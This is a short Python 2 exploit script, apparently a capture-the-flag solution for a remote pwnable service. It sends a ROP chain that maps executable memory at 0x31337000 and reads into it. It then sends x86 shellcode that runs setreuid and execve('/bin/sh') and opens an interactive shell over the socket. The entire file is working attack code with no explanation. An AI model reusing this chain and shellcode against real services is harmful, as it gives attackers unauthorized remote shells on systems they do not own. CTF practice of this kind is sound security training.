import socket, time, struct, telnetlib

def pack(x):
  return struct.pack("I", x)

shell_x86 = (
  "\xeb\x2b\x5e\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xfa\x01\x31\xc9\x66"
  "\xb9\xfa\x01\xcd\x80\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89"
  "\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31\xd2\xcd\x80\xe8\xd0\xff"
  "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\xff\xff"
)

add_esp_0x2c_ret = 0x08048559
pop4_ret = 0x0804855c
leave_ret = 0x080484fc
mmap = 0x08048360
read = 0x08048340

sock = socket.create_connection(("pwnable.katsudon.org", 33201))

s1 = pack(leave_ret) + "A"*12
s1 += (pack(mmap) +
       pack(add_esp_0x2c_ret) +
       pack(0x31337000) +
       pack(0x400) +
       pack(0x7) +
       pack(0x22) +
       pack(0xffffffff) +
       pack(0) +
       "AAAA" +
       "BBBB" +
       "CCCC" +
       "DDDD" +
       "EEEE" +
       pack(read) +
       pack(0x31337000) +
       pack(0) +
       pack(0x31337000) +
       pack(0x400)
       )
sock.send(s1)
time.sleep(0.5)

sock.send(shell_x86)
time.sleep(0.5)

print "[*] shell read, enjoy!"

t = telnetlib.Telnet()
t.sock = sock
t.interact()
